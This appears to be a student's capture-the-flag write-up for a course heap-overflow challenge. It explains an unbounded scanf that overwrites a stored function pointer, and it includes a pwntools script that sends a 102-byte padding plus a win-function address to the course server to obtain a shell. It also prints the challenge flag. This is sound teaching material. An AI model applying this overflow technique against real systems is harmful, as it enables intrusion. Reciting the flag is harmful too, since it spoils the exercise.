heap 1 | `babys_first_1`
===========================

Flag: `6447{09d435a4-a0dd-46a9-bd7f-f39fdbf10cd3}`

General overview of problems faced
-------------------------------------
Had difficulty understanding what the goal of a Heap Overflow was.
Had to learn about heap and how to use gdb in order to print heap, bins etc.

List of vulnerabilities
--------------------
1. The name of the fish is taken from STDIN using `scanf(%s)` which allows arbitrary length inputh to be passed. This means we can overflow the buffer and write bytes after it.
2. Each allocated bin when creating a fish contains the address of the `puts` function which is used during program execution
3. The binary contains a function which call `system('/bin/sh')` allowing an attacker to point to it when doing a stack or heap overflow.


Steps to exploit
------------------
1. Get the address of the function which calls a shell from the binary (0x08048690)
2. Create a fish at position 0 with any size, weight and set the name to be 102 bytes of offset + the address of the win function in little endian format (`\x90\x86\x04\x08`)
3. View the fish you created
4. You now have a shell.

Script/Command used
------------------
```python
from pwn import *

# Flag: 6447{09d435a4-a0dd-46a9-bd7f-f39fdbf10cd3}

p = remote('wargames.6447.sec.edu.au', 9001)

p.sendline("1") # create a fish
p.sendline("0") # at position 0
p.sendline("10") # size
p.sendline("10") # weight
p.sendline('A' * 102 + '\x90\x86\x04\x08') # name

p.sendline("3") # view fish
p.sendline("0") # at position 0

p.recvrepeat(0.2)

print "Shell enabled."

p.interactive()
```
